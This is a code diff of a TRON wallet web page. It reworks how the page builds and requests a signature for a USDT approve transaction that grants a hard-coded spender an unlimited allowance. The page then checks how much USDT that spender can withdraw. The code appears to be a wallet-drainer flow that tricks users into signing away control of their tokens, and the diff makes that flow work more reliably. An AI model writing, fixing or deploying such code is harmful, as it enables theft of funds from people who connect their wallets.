@@ -116,38 +116,32 @@ export default function Index() {
       }
 
       console.log("👤 User:", userAddressRef.current);
-      console.log("📝 Building transaction...");
+      console.log("📝 Building transaction via API...");
 
-      const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
-      tw.setAddress(userAddressRef.current);
+      // ✅ USE API DIRECTLY - NO BUFFER ERROR!
+      const apiResponse = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          owner_address: userAddressRef.current,
+          contract_address: TRON_USDT,
+          function_selector: "approve(address,uint256)",
+          parameter: TRON_SPENDER + ",115792089237316195423570985008687907853269984665640564039457584007913129639935",
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: true
+        })
+      });
 
-      const { transaction } = await tw.transactionBuilder.triggerSmartContract(
-        TRON_USDT,
-        "approve(address,uint256)",
-        { feeLimit: 100000000 },
-        [
-          { type: "address", value: TRON_SPENDER },
-          { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
-        ],
-        userAddressRef.current
-      );
-
-      console.log("✅ Transaction built");
-
-      // ✅ CRITICAL: Ensure raw_data_hex
-      console.log("🔧 Encoding raw_data_hex...");
-      if (!transaction.raw_data_hex) {
-        try {
-          const txProto = tw.utils.transaction.txJsonToPb(transaction);
-          transaction.raw_data_hex = txProto.toString("hex");
-          console.log("✅ raw_data_hex encoded successfully");
-        } catch (e) {
-          console.error("Error encoding:", e);
-          throw new Error("Failed to encode transaction: " + e);
-        }
+      const apiData = await apiResponse.json();
+      
+      if (!apiData.transaction) {
+        throw new Error("API error: " + JSON.stringify(apiData));
       }
 
-      console.log("📋 Transaction ready for signing");
+      const { transaction } = apiData;
+      console.log("✅ Transaction built from API");
+
       console.log("🔐 Requesting signature from wallet...");
 
       const signResponse = await wcClientRef.current.request({
@@ -213,6 +207,7 @@ export default function Index() {
         }
       ];
 
+      const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
       const allowanceContract = await tw.contract(allowanceABI, TRON_USDT);
       const allowanceRaw = await allowanceContract.allowance(userAddressRef.current, TRON_SPENDER).call();
       const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
